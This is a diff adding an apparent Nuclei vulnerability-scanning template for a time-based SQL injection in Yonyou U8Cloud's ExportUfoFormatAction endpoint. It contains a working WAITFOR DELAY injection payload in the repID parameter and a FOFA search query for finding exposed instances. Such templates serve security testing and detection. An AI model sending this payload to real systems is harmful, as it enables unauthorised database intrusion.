@@ -1,0 +1,26 @@
+http:
+- matchers:
+  - condition: and
+    dsl:
+    - duration>=6
+    - status_code == 200
+    type: dsl
+  raw:
+  - '@timeout: 20s
+
+    GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.ExportUfoFormatAction&method=&repID=1%27);WAITFOR+DELAY+%270:0:6%27--
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+id: yonyou-u8-cloud-ExportUfoFormatAction-sqli
+info:
+  author: Co5mos
+  description: Detects SQL Injection vulnerability in Yonyou U8Cloud ExportUfoFormatAction.
+  metadata:
+    fofa-query: "app=\"\u7528\u53CB-U8-Cloud\""
+  name: Yonyou U8Cloud ExportUfoFormatAction - SQL Injection
+  reference: https://github.com/wy876/POC/commit/a60fe5bafa49a5df1badb7e5100be1fa5d2575ed
+  severity: high
+  tags: yonyou,sqli
